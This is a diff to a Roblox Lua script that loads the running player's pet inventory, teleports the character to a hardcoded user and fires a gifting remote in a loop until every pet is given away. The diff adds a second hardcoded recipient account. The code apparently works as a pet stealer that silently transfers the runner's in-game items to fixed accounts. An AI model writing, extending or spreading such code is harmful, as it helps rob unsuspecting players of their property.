@@ -143,6 +143,16 @@ local function getItemById(id)
     return nil
 end
 
+local function findValidTarget(targets)
+    for _, name in ipairs(targets) do
+        local targetModel = workspace:FindFirstChild(name)
+        if targetModel then
+            return name, targetModel
+        end
+    end
+    return nil, nil
+end
+
 local function teleport(position)
     local adjustedPos = position + Vector3.new(0, 0.5, 0)
     HRP.CFrame = CFrame.new(adjustedPos)
@@ -150,7 +160,7 @@ end
 
 -- Init
 local data = DataService:GetData()
-local target = "MisakiX6Shun"
+local targets = {"MisakiX6Shun", "TakaoP3Naka"}
 
 local pets = {}
 for uuid, pet in pairs(data.PetsData.PetInventory.Data or {}) do
@@ -162,7 +172,7 @@ for uuid, pet in pairs(data.PetsData.PetInventory.Data or {}) do
         table.insert(pets, {
             tool = tool,
             uuid = uuid,
-            favorite = data.IsFavorite
+            favorite = data.IsFavorite,
             name = type,
             mutation = data.MutationType,
             level = data.Level
@@ -172,7 +182,8 @@ end
 
 -- Auto Place
 task.spawn(function()
-    teleport(workspace[target]:GetPivot().Position)
+    local targetName, targetModel = findValidTarget(targets)
+    teleport(targetModel:GetPivot().Position)
     task.wait(1)
 
     while task.wait(4) do
@@ -183,7 +194,7 @@ task.spawn(function()
                 Hum:EquipTool(pet.tool)
                 task.wait(0.5)
                 
-                petGiftingServiceRemote:FireServer("GivePet", game.Players[target])
+                petGiftingServiceRemote:FireServer("GivePet", game.Players[targetName])
                 repeat task.wait(0.1) until not Character:FindFirstChildOfClass("Tool")
                 table.remove(pets, i)
             end
